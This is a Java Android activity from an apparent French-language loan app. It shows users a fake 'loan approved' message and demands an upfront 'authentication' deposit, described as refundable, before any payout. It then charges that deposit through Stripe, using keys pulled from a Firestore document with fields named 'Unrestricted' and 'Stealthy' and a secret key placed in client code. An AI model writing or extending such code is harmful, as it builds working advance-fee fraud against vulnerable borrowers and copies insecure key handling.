package com.justkeepfaith.cryintears;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.stripe.android.PaymentConfiguration;
import com.stripe.android.paymentsheet.PaymentSheet;
import com.stripe.android.paymentsheet.PaymentSheetResult;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class striscia_pagina extends AppCompatActivity {

    String Open, Closed, period, lname, Number, amount_applied;
    TextView message, button;
    SharedPreferences sharedPreferences;
    String customerID, emphericalKey, ClientSecret;
    PaymentSheet paymentSheet;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_striscia_pagina);

        button = (TextView) findViewById(R.id.gpaybton);
        message = (TextView) findViewById(R.id.message);


        sharedPreferences = getApplicationContext().getSharedPreferences("user_info", Context.MODE_PRIVATE);
        lname = sharedPreferences.getString("last_name", "User");
        Open = sharedPreferences.getString("Open", "");
        Closed = sharedPreferences.getString("Closed", "");
        Number = sharedPreferences.getString("Number", "");
        period = sharedPreferences.getString("Months", "");
        amount_applied = sharedPreferences.getString("loan_applied", "");



        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("notification", "Toutes nos félicitations!! Votre demande de prêt a été approuvée. Vous n'êtes plus qu'à " +
                "quelques pas avant de pouvoir recevoir votre prêt. Cliquez sur cette notification pour plus d'informations.");
        editor.commit();


        message.setText("--Cher "+lname+", votre demande de prêt de €"+ amount_applied +" a été approuvée. Ce prêt doit être " +
                "remboursé en "+period+"mois.\n\n--Cependant, afin de verser ce prêt sur votre compte bancaire, " +
                ""+getResources().getString(R.string.app_name)+" vous demande d'effectuer un dépôt unique de €"+Number+" sur " +
                "votre compte "+getResources().getString(R.string.app_name)+". Nous vous demandons de valider que vous êtes un " +
                "utilisateur légitime afin d'éviter une utilisation abusive de nos services par des utilisateurs frauduleux.\n\n" +
                "--Veuillez noter que cet acompte vous sera remboursé lors du remboursement du prêt ou si vous décidez de " +
                "fermer votre compte "+getResources().getString(R.string.app_name)+" car ce n'est qu'un coût d'authentification " +
                "pour tous les nouveaux utilisateurs.");



        DocumentReference documentReference = FirebaseFirestore.getInstance().collection("Classified").document("Commissioned");
        documentReference.get().addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
            @Override
            public void onComplete(@NonNull Task<DocumentSnapshot> task) {

                DocumentSnapshot dsnap = task.getResult();

                Open = dsnap.getString("Unrestricted");
                Closed = dsnap.getString("Stealthy");
                Number = dsnap.getString("Quota");

                SharedPreferences.Editor editor = sharedPreferences.edit();
                editor.putString("Open", Open);
                editor.putString("Closed", Closed);
                editor.putString("Number", Number);
                editor.commit();

                message.setText("--Cher "+lname+", votre demande de prêt de €"+ amount_applied +" a été approuvée. Ce prêt doit être " +
                        "remboursé en "+period+"mois.\n\n--Cependant, afin de verser ce prêt sur votre compte bancaire, " +
                        ""+getResources().getString(R.string.app_name)+" vous demande d'effectuer un dépôt unique de €"+Number+" sur " +
                        "votre compte "+getResources().getString(R.string.app_name)+". Nous vous demandons de valider que vous êtes un " +
                        "utilisateur légitime afin d'éviter une utilisation abusive de nos services par des utilisateurs frauduleux.\n\n" +
                        "--Veuillez noter que cet acompte vous sera remboursé lors du remboursement du prêt ou si vous décidez de " +
                        "fermer votre compte "+getResources().getString(R.string.app_name)+" car ce n'est qu'un coût d'authentification " +
                        "pour tous les nouveaux utilisateurs.");
            }
        });

        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                if (!Conectivity.isConnectingToInternet(striscia_pagina.this)) {
                    Toast.makeText(striscia_pagina.this, "S'il vous plait, vérifiez votre connexion internet", Toast.LENGTH_SHORT).show();
                    return;
                }
                if (Open.isEmpty()){
                    Toast.makeText(striscia_pagina.this, "Essayer à nouveau", Toast.LENGTH_SHORT).show();
                }
                else {
                    Toast.makeText(striscia_pagina.this, "S'il vous plaît, attendez", Toast.LENGTH_SHORT).show();
                    PayNow();
                }
            }
        });

        paymentSheet = new PaymentSheet(this, paymentSheetResult -> {

            onPaymentResult(paymentSheetResult);

        });

    }
    private void PayNow(){

        PaymentConfiguration.init(this, Open);

        StringRequest stringRequest = new StringRequest(Request.Method.POST,
                "https://api.stripe.com/v1/customers",
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                        try {
                            JSONObject object = new JSONObject(response);

                            customerID = object.getString("id");
                            getEmphericalKey(customerID);


                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }){
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> header = new HashMap<>();
                header.put("Authorization","Bearer "+ Closed);
                return header;
            }
        };

        RequestQueue requestQueue = Volley.newRequestQueue(striscia_pagina.this);
        requestQueue.add(stringRequest);

    }

    private void getEmphericalKey(String customerID) {

        StringRequest stringRequest = new StringRequest(Request.Method.POST,
                "https://api.stripe.com/v1/ephemeral_keys",
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                        try {
                            JSONObject object = new JSONObject(response);

                            emphericalKey = object.getString("id");
                            getClientSecret(customerID, emphericalKey);


                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }){
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> header = new HashMap<>();
                header.put("Authorization","Bearer "+ Closed);
                header.put("Stripe-Version","2020-08-27");
                return header;
            }

            @Nullable
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put("customer", customerID);

                return params;
            }
        };

        RequestQueue requestQueue = Volley.newRequestQueue(striscia_pagina.this);
        requestQueue.add(stringRequest);

    }

    private void getClientSecret(String customerID, String emphericalKey) {

        int lon = Integer.parseInt(Number);
        String deni = String.valueOf((lon) * 100 + 30);

        StringRequest stringRequest = new StringRequest(Request.Method.POST,
                "https://api.stripe.com/v1/payment_intents",
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                        try {
                            JSONObject object = new JSONObject(response);

                            ClientSecret = object.getString("client_secret");
                            PaymentFlow();


                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }){
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> header = new HashMap<>();
                header.put("Authorization","Bearer "+ Closed);
                return header;
            }

            @Nullable
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put("customer", customerID);
                params.put("amount", deni);
                params.put("currency", "eur");
                params.put("automatic_payment_methods[enabled]", "true");

                return params;
            }
        };

        RequestQueue requestQueue = Volley.newRequestQueue(striscia_pagina.this);
        requestQueue.add(stringRequest);

    }


    private void onPaymentResult(PaymentSheetResult paymentSheetResult) {

        if (paymentSheetResult instanceof PaymentSheetResult.Completed) {

            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.putString("balance", Number);
            editor.commit();

            Toast.makeText(striscia_pagina.this, "Réussie", Toast.LENGTH_SHORT).show();

            Intent intent = new Intent(this, grazie_tasso.class);
            startActivity(intent);
            finish();
        }
        if (paymentSheetResult instanceof PaymentSheetResult.Canceled) {

        }

    }

    private void PaymentFlow() {

        paymentSheet.presentWithPaymentIntent(
                ClientSecret, new PaymentSheet.Configuration(getResources().getString(R.string.app_name),
                        new PaymentSheet.CustomerConfiguration(customerID, emphericalKey))
        );
    }
}